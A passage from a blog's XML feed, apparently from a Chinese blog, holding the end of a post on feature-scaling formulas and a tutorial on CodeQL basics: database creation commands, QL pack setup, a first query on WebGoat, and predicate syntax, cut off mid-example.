391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1794.4,0)"><path data-c="1D707" d="M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mi" transform="translate(1133.2,-686)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z" style="stroke-width: 3;"/></g><rect width="2597.4" height="60" x="120" y="220"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>x</mi><mo data-mjx-alternate="1">′</mo></msup><mo>=</mo><mfrac><mrow><mi>x</mi><mo>−</mo><mi>μ</mi></mrow><mi>σ</mi></mfrac></math></mjx-assistive-mml></mjx-container><p>对异常值不敏感，更适合正态分布的数据。</p><h3 id="最大绝对值缩放（MaxAbsScaler）"><strong>最大绝对值缩放（MaxAbsScaler）</strong></h3><p>将特征缩放到 [-1, 1] 之间，保持稀疏性，适用于稀疏数据集。</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -2.17ex;" xmlns="http://www.w3.org/2000/svg" width="11.651ex" height="4.699ex" role="img" focusable="false" viewbox="0 -1118 5149.9 2077" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(605,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1127.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(2183,0)"><g data-mml-node="mi" transform="translate(1197.5,676)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mrow" transform="translate(220,-709.5)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" style="stroke-width: 3;"/><path data-c="61" d="M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z" transform="translate(833,0)" style="stroke-width: 3;"/><path data-c="78" d="M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z" transform="translate(1333,0)" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(2248.9,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z" style="stroke-width: 3;"/></g></g><rect width="2726.9" height="60" x="120" y="220"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>x</mi><mo data-mjx-alternate="1">′</mo></msup><mo>=</mo><mfrac><mi>x</mi><mrow><mo data-mjx-texclass="ORD" stretchy="false">|</mo><msub><mi>x</mi><mrow data-mjx-texclass="ORD"><mo data-mjx-texclass="OP" movablelimits="true">max</mo></mrow></msub><mo data-mjx-texclass="ORD" stretchy="false">|</mo></mrow></mfrac></math></mjx-assistive-mml></mjx-container><h3 id="对数缩放（Log-Scaling）"><strong>对数缩放（Log Scaling）</strong></h3><p>用于缩放右偏的特征（长尾分布）：</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="14.782ex" height="2.396ex" role="img" focusable="false" viewbox="0 -809 6533.5 1059" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(605,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1127.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(2183,0)"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z" style="stroke-width: 3;"/><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)" style="stroke-width: 3;"/><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3461,0)"><path data-c="2061" d="" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3461,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(3850,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(4644.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(5644.5,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6144.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>x</mi><mo data-mjx-alternate="1">′</mo></msup><mo>=</mo><mi>log</mi><mo data-mjx-texclass="NONE">⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container>]]></content>
      
      
      <categories>
          
          <category> AI相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 线性回归 </tag>
            
            <tag> 特征放缩 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeql查询语法笔记</title>
      <link href="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="生成数据库">生成数据库</h2><p>以下为各种语言创建数据库的命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">java</span></span><br><span class="line">codeql database create &quot;~/CodeQL/databases/code-database&quot; --source-root=&quot;~/CodeQL/projects/java-code&quot; --language=java --command=&quot;mvn clean install -file pom.xml&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Go</span></span><br><span class="line">codeql database create &quot;~/CodeQL/databases/code-database&quot; --source-root=&quot;~/CodeQL/projects/java-code&quot; --language=go</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Python</span></span><br><span class="line">codeql database create &quot;~/CodeQL/databases/code-database&quot; --source-root=&quot;~/CodeQL/databases/code-database&quot; --language=python</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">JavaScript</span></span><br><span class="line">codeql database create &quot;~/CodeQL/databases/code-database&quot; --source-root=&quot;~/CodeQL/databases/code-database&quot; --language=javascript</span><br></pre></td></tr></table></figure><p><code>CodeQL</code>不支持<code>PHP</code>，支持的编程语言类型，参考官网<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>。对于<code>Java</code>代码有些不同，需要进行代码的编译后<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>，才能生成相关的数据库。</p><p>编译过程中，若出现环境问题可使用<code>--verbose</code>输出详细的错误，进行错误的定位。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create webgoat-qldb -language= java --command &quot;./mvnw clean package -DskipTests&quot; --verbose</span><br></pre></td></tr></table></figure><p>对于<code>Java</code>代码的特殊性<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>，，实战中获取到的可能是编译后的<code>Java</code>代码，这里可以使用工具<code>CodeQLpy</code><sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>，它可以对多种不同类型的java代码进行代码审计，包括jsp文件、SpringMVC的war包、SpringBoot的jar包、maven源代码。</p><h2 id="基础语法结构">基础语法结构</h2><p><code>Codeql</code>查询语法有点类似<code>SQL</code>查询，结构如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Query metadata</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import <span class="comment">/* ... CodeQL libraries or modules ... */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... Optional, define CodeQL classes and predicates ... */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="comment">/* ... 变量声明 ... */</span></span><br><span class="line"><span class="keyword">where</span> <span class="comment">/* ... 逻辑处理 ... */</span></span><br><span class="line"><span class="keyword">select</span> <span class="comment">/* ... 表达式 ... */</span></span><br></pre></td></tr></table></figure><h2 id="编写第一个查询">编写第一个查询</h2><h3 id="创建第一个QL包">创建第一个QL包</h3><p>这里以<code>WebGoat</code><sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>创建的数据库为查询对象。</p><p>创建一个文件夹，用来存放后续你编写的<code>CodeQL</code>脚本，<code>CodeQL</code>官方称这个文件夹为<code>QL Pack</code>。</p><p>例如名为<code>qltest</code>的文件夹，并在里面创建1个<code>QL Pack</code>的配置文件，名称固定为<code>qlpack.yml</code>。再创建一个ql后缀的文件，名称随意。</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250223211310603.png" alt="image-20250223211310603"></p><p><code>qlpack.yml</code>文件中写入以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">qltest</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">0.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">libraryPathDependencies:</span> <span class="string">codeql-java</span></span><br></pre></td></tr></table></figure><ul><li><p>第一行表示这个QL包的名称为<code>qltest</code>，必选，如果你在VSCode中同时打开多个QL包时，要保证这个name的值唯一不重复。</p></li><li><p>第二行表示这个QL包的版本号，必选。</p></li><li><p>第三行表示这个QL包的依赖，必选，codeql-java表示需要Java语言的QL标准库依赖。</p></li></ul><p>在VSCode的CodeQL插件中添加用CodeQL创建的WebGoat的数据库</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250223210106772.png" alt="image-20250223210106772"></p><h3 id="编写查询">编写查询</h3><p>在<code>webgoat-query.ql</code>文件中编写如下代码，用来查找WebGoat项目中所有声明的方法。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Method</span> m</span><br><span class="line"><span class="keyword">select</span> m</span><br></pre></td></tr></table></figure><p>然后右键点击<code>webgoat-query.ql</code>文件，点击【CodeQL: Run Query 】来执行本次查询，执行完成后在右边可以看到多出一列用来显示查询结果。</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250223211244232.png" alt="image-20250223211244232"></p><h2 id="QL语言参考">QL语言参考</h2><ul><li><a href="https://codeql.github.com/docs/ql-language-reference/about-the-ql-language/">关于 QL 语言</a>：QL 是 CodeQL 的强大查询语言，用于分析代码。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/predicates/">谓词</a>：谓词用于描述构成 QL 程序的逻辑关系。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/queries/">查询</a>：查询是 QL 程序的输出。他们评估结果集。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/types/">类型</a>：QL 是一种静态类型语言，因此每个变量都必须有一个声明的类型。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/modules/">模块</a>：模块提供了一种通过将相关类型、谓词和其他模块组合在一起来组织 QL 代码的方法。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/aliases/">别名</a>：别名是现有 QL 实体的替代名称。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/variables/">变量</a>：QL 中的变量与代数或逻辑中的变量的使用方式类似。它们代表一组值，这些值通常受公式限制。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/expressions/">表达式</a>：表达式计算为一组值并具有类型。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/formulas/">公式</a>：公式定义了表达式中使用的自由变量之间的逻辑关系。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/annotations/">注释</a>：注释是一个字符串，您可以将其直接放在 QL 实体或名称的声明之前。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/recursion/">递归</a>：QL 为递归提供了强大的支持。如果 QL 中的谓词直接或间接依赖于自身，则称其为递归谓词。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/lexical-syntax/">词法语法</a>：QL 语法包括不同种类的关键字、标识符和注释。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/name-resolution/">名称解析</a>：QL 编译器将名称解析为程序元素。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/evaluation-of-ql-programs/">QL方案的评价</a>：以多个不同的步骤评估QL程序。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/">QL 语言规范</a>：QL语言的形式规范。它为术语，语法和有关QL的其他技术细节提供了全面的参考。</li></ul><h3 id="谓词Predicates">谓词Predicates</h3><p>官方文档<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup> ,谓词（Predicates）有点类似于其他语言中的函数，但又与函数不同，谓词用于描述构成 QL 程序的逻辑关系。确切的说，谓词描述的是给定参数与元组集合的关系。<br>定义谓词有以下几个注意点(坑点)：</p><ol><li>需要注意的是谓词的名字<strong>开头必须是小写字母</strong>。</li><li>绑定行为与绑定集。</li></ol><h4 id="无结果谓词">无结果谓词</h4><p>没有结果的谓词以predicate作为开头，剩下的语法结构类似于定义函数。这种谓词只能在where语句中使用<sup class="footnote-ref"><a href="#fn7" id="fnref7">[7]</a></sup>。</p><p>例子如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">predicate isCity(string city) &#123;</span><br><span class="line">city <span class="operator">=</span> &quot;Beijing&quot;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">city <span class="operator">=</span> &quot;ShangHai&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> string city</span><br><span class="line"><span class="keyword">where</span> city <span class="operator">=</span> &quot;Beijing&quot; <span class="keyword">and</span> isCity(city)</span><br><span class="line"><span class="keyword">select</span> city</span><br></pre></td></tr></table></figure><h4 id="结果谓词">结果谓词</h4><p>有结果的谓词的定义类似于<code>C/C++</code>语言的函数定义，已返回类型替代<code>predicate</code>作为开头。这种谓词可以在<code>where</code>与<code>select</code>语句中使用。</p><p>简单的例子如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> addOne(<span class="type">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">    i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">10</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> v</span><br><span class="line"><span class="keyword">where</span> v <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> 